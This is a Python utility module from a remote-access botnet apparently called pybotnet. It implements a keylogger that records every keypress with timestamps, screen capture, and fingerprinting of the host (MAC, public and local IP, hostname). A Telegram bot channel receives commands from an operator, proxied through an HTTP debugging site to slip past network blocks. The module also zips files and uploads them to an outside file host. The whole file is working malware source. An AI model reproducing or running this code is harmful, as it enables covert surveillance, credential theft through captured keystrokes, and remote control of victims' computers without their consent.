'''Common utilities'''

# pybotnet modules
from . import settings

# import built-in & third-party modules
import datetime
import requests
import json
import platform
import time
import zipfile
import os
from typing import List
from pynput import keyboard
from socket import gethostname, gethostbyname
from uuid import getnode as get_system_mac_addres
from bs4 import BeautifulSoup
from PIL import ImageGrab


class KeyLogger:
    '''this class is for keylogger utility , you should only start this class from a threading object.
    this way , the keylogger and the app itself will both run at the same time.'''

    def __init__(self) -> None:
        self.filename = "klog.txt"

    def pressed_key(self, key):
        """if a key is presses , this function will be called and it will write data."""
        with open(self.filename, 'a', errors='ignore') as logs:
            logs.write('{0} {1}\n'.format(
                str(datetime.datetime.now()), str(key)))

    def start(self):
        """starting point of keylogger."""
        global listener
        listener = keyboard.Listener(on_press=self.pressed_key,)
        listener.start()

    def stop(self):
        """stops listener"""
        global listener
        listener.stop()


def get_current_epoc_time() -> float:
    return time.time()


def get_host_name_ip() -> str:
    try:
        host_name = gethostname()
        host_ip = gethostbyname(host_name)
        return f'{host_ip}\nHostname: {host_name}'
    except:
        return 'Unknown'


def get_my_global_ip() -> str:
    '''return system ip (3 API server)'''
    try:
        return get_my_ip_server_1()

    except:
        try:
            return get_my_ip_server_2()

        except:
            try:
                return get_my_ip_server_3()

            except:
                return 'Unknown'

# Servers to get your public IP


def get_my_ip_server_1():
    '''return global ip V4 and loaction \n
    server 1'''
    takeip = requests.post("https://api.myip.com", timeout=3).text
    ip = str(json.loads(takeip)["ip"])
    country = str(json.loads(takeip)["country"])
    ipaddr = f"{ip}\ncountry: {country}"
    return ipaddr


def get_my_ip_server_2():
    '''return global ip V4 \n
    server 2'''
    return requests.get('https://api.ipify.org', timeout=3).text


def get_my_ip_server_3():
    '''return global ip V4 \n
    server 3'''
    return requests.get('https://ident.me', timeout=3).text


def get_short_system_info() -> str:
    '''system mac addres, ip addres, operating system'''

    short_system_info = f"""------system info------
OS: {platform.system()}
Mac Addres: {get_system_mac_addres()}
Global ip: {get_my_global_ip()}"""

    return short_system_info


def get_full_system_info(pybotnet_uptime=None) -> str:
    f'''return full system info: \n
    get_short_system_info and pybotnet up time, local ip, pybotnet version'''

    full_system_info = f"""{get_short_system_info()}
Up Time: {pybotnet_uptime} Seconds
Local ip: {get_host_name_ip()}
Current Route: {os.getcwd()}
Pid: {os.getpid()}
cpu count: {os.cpu_count()}
Pybotnet Version: {settings.pybotnet_version}
-----------------------"""

    # TODO: system uptime: {None}

    return full_system_info


def make_send_message_api_url(TELEGRAM_TOKEN, ADMIN_CHAT_ID, message) -> str:
    '''
    return api url for send message \n
    return f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/SendMessage?chat_id={ADMIN_CHAT_ID}&text={message}"
    '''
    return f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/SendMessage?chat_id={ADMIN_CHAT_ID}&text={message}"


def post_data_by_third_party_proxy(url, logger, time_out=5):
    '''
    return False or response \n
    Send information using the http debugger site \n
    Only for special situations: \n
    Internet restrictions in some countries
    '''
    payload = {"UrlBox": url,
               "AgentList": "Mozilla Firefox",
               "VersionsList": "HTTP/1.1",
               "MethodList": "POST"
               }

    try:
        response = requests.post(
            url="https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",
            data=payload,
            timeout=time_out)

        if response.status_code == 200:
            logger.info(
                'post_data_by_third_party_proxy data sended response: 200')
            return response

        logger.error(
            f'post_data_by_third_party_proxy error: data not sended response: {response.status_code}')
        return False

    except requests.exceptions.Timeout:
        logger.error(f'post_data_by_third_party_proxy error: timeout ')
        return False
    except:
        logger.error(f'post_data_by_third_party_proxy Unknown error')
        return False


def send_message_by_third_party_proxy(message: str, TELEGRAM_TOKEN: str, ADMIN_CHAT_ID: str, logger):
    '''Send messages by api url and third party proxy to adimn'''
    api_url = make_send_message_api_url(
        TELEGRAM_TOKEN, ADMIN_CHAT_ID, message)
    return post_data_by_third_party_proxy(api_url, logger)


def clean_response_third_party_proxy(response, logger):
    '''get http response from third party proxy (http debuger .com) and get telegram data'''
    try:
        response_source = response.text
        response_source = BeautifulSoup(response_source, "html.parser")
        response_source = response_source.find("div", id="ResultData").text
        return response_source.strip()

    except Exception as error:
        logger.info(
            f'clean_response_third_party_proxy: {error}')
        return False


def get_update_by_third_party_proxy(TELEGRAM_TOKEN, logger) -> List[dict]:
    '''Get the latest command sent to the bot in the last 24 hours by third party proxy'''

    get_updates_api_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/Getupdates"

    response = post_data_by_third_party_proxy(
        get_updates_api_url, logger)

    if not response:
        logger.error(
            'get_command_by_third_party_proxy > post_data_by_third_party_proxy return False')
        return False

    try:
        response_source = clean_response_third_party_proxy(
            response, logger=logger)
        if not response_source:
            return False

        if 'The remote server returned an error' in response_source:
            logger.error(
                f'get_update_by_third_party_proxy: [False TOKEN , ADMIN_CHAT_ID or api data] error: {response_source}')
            return False

        response_source = response_source.replace("Response Content", "")
        response_source = response_source.replace("edited_message", "message")
        response_source = json.loads(response_source)['result']
        return response_source
    except:
        logger.error(
            'get_update_by_third_party_proxy error Data extraction failed')
        return False


def get_last_update_id(messages: list, ADMIN_CHAT_ID: str, logger):
    ''' get last admin message and return update_id '''

    if messages == []:
        return False

    for message in messages[::-1]:
        try:
            last_message_chat_id = str(message['message']['chat']['id'])
            update_id = str(message["update_id"])
            if last_message_chat_id == ADMIN_CHAT_ID:
                return update_id
        except:
            continue

    # try to get last update_id and return
    last_message = messages.pop()
    try:
        return str(last_message["update_id"])
    except:
        logger.error(
            'get_last_update_id Failed to extract the latest update_id')
        return False


def set_message_ofset(messages: list, TELEGRAM_TOKEN: str, ADMIN_CHAT_ID: str, logger) -> None:
    '''this founction seen the last message from admin and delete before message'''

    update_id = get_last_update_id(messages, ADMIN_CHAT_ID, logger)

    if update_id:
        api_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/Getupdates?offset={update_id}"

        if post_data_by_third_party_proxy(api_url, logger):
            logger.info(f'Set_message_to_read Message_id: {update_id} DONE')
            return

    logger.error('set_message_ofset Failed')


def extract_last_admin_command(messages: list, ADMIN_CHAT_ID: str, TELEGRAM_TOKEN: str,  logger, previous_update_id=[0]):
    '''extract command in html source 
    this function use for httpdebuger.com: get_update_by_third_party_proxy()'''
    message_text = False

    for message in messages[::-1]:
        try:
            last_message_chat_id = str(message['message']['chat']['id'])
            last_text = message['message']['text']
            update_id = int(message["update_id"])
        except:
            continue

        if last_message_chat_id == ADMIN_CHAT_ID:
            if update_id <= previous_update_id[0]:
                logger.info(
                    f' - previous command from admin: {last_text}, "This command has already been executed"')
                return False

            previous_update_id[0] = update_id
            logger.info(
                f' - new command from admin: {last_text}')
            message_text = last_text
            break

        # Messages from Anonymous
        logger.info(f' -message from {last_message_chat_id}: {last_text}')

    # remove previous commands
    set_message_ofset(messages, TELEGRAM_TOKEN, ADMIN_CHAT_ID, logger)

    return message_text


def get_last_admin_command_by_third_party_proxy(ADMIN_CHAT_ID: str, TELEGRAM_TOKEN: str,
                                                previous_update_id: List[int], logger):
    ''' extract command from  admin or false'''

    messages_list = get_update_by_third_party_proxy(
        TELEGRAM_TOKEN, logger=logger)

    # if message list not False > extract last message from admin > if last admin message not False return
    if messages_list:
        last_message = extract_last_admin_command(
            messages_list, ADMIN_CHAT_ID, TELEGRAM_TOKEN, logger, previous_update_id)
        if last_message:
            return last_message
    return False


def make_zip_file(route, logger, delete_input_file=False):
    '''get file route, make zip file and save to courent route \n
    return True, new_file_name |or| return False, 'None' \n
    sample: istrue, file_name = make_zip(./test.txt)

    To send a file in Telegram, this file must be zipped
    '''

    # input: /home/onion/text.py ooutput: text.zip
    new_file_name = os.path.splitext(os.path.basename(route))[0]
    new_file_name = f'{new_file_name}.zip'

    if not os.path.isfile(route):
        logger.error('make_zip_file: is not a file')
        return False, 'make_zip_file: is not a file'

    try:
        with zipfile.ZipFile(new_file_name, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.write(route, os.path.basename(route))

        logger.info(
            f'make_zip_file: The file was successfully zipped, file name {new_file_name}')

        if delete_input_file:
            os.remove(route)

        return True, new_file_name

    except Exception as error:
        logger.error(f'make_zip_file: {error}')
        return False, str(error)


def conver_json_to_dict(json_data: json) -> dict:
    '''loads json data and convert to a dict'''
    return json.loads(json_data)


def upload_server_1(file: bytes, file_name: str, logger, time_out: int = 1200, file_type: str = 'zip'):
    # time_out 1200 s == 20 min
    '''api for upload zip file and return download link \n
    this use in commands: import_file, screen_shut, key_loger,.. \n
    its not safe for file transfer!
    api from: up.ufile.io
    size limit 5GB'''
    create_session_link = 'https://up.ufile.io/v1/upload/create_session'
    chunk_link = 'https://up.ufile.io/v1/upload/chunk'  # Send part of the file
    finalise_link = 'https://up.ufile.io/v1/upload/finalise'
    file_size = {'file_size': len(file)}
    files = {'file': file}

    # create session for upload file
    # TODO: add for lop for get a session
    try:
        session = requests.post(create_session_link,
                                data=file_size, timeout=30)
        if session.status_code != 200:
            logger.error(
                f'upload_server_1.create session: status code: {session.status_code}, text: {session.text}')
            return False, 'None'
        # session FUID:
        FUID = conver_json_to_dict(session.text)['fuid']
    except Exception as error:
        logger.error(f'upload_server_1.create session: {error}')
        return False, 'None'

    # upload file
    # TODO: Divide the data into small pieces and upload them
    try:
        chunk_data = {'chunk_index': 1, 'fuid': FUID}
        chunk_res = requests.post(chunk_link, data=chunk_data,
                                  files=files, timeout=time_out)
        if chunk_res.status_code != 200:
            logger.error(
                f'upload_server_1.upload file: status code: {chunk_res.status_code}, text: {chunk_res.text}')
            return False, 'None'
    except Exception as error:
        logger.error(f'upload_server_1.upload file : {error}')
        return False, 'None'

    # close session
    try:
        finalise_headers = {
            'fuid': FUID,
            'file_name': file_name,
            'file_type': file_type,
            'total_chunks': 1
        }

        finalis_res = requests.post(
            finalise_link, data=finalise_headers, timeout=30)
        if finalis_res.status_code != 200:
            logger.error(
                f'upload_server_1.close session , status code: {finalis_res.status_code}, text: {finalis_res.text}')
            return False, 'None'
    except Exception as error:
        logger.error(f'upload_server_1.close session error: {error}')
        return False, 'None'

    # extract download link
    try:
        download_link = conver_json_to_dict(finalis_res.text)
        response = ''
        for key, value in download_link.items():
            response = response + f'\n{key}: {value}'
        return True, response
    except Exception as error:
        logger.error(f'upload_server_1.extract download link error: {error}')
        return False, 'None'


def screenshot_pil(logger, route: str = ''):
    '''get a sreenshot and save to file , return file name or False'''
    try:
        file_name = str(get_current_epoc_time()).replace('.', '_')
        file = open(f'{route}{file_name}.png', 'wb')

        screenshot = ImageGrab.grab()
        # Save the image to the file object as a PNG
        screenshot.save(file, 'PNG')

        file.close()
        return f'{file_name}.png'

    except Exception as error:
        logger.info(f'util.screenshot_pil error: {error}')
        return False
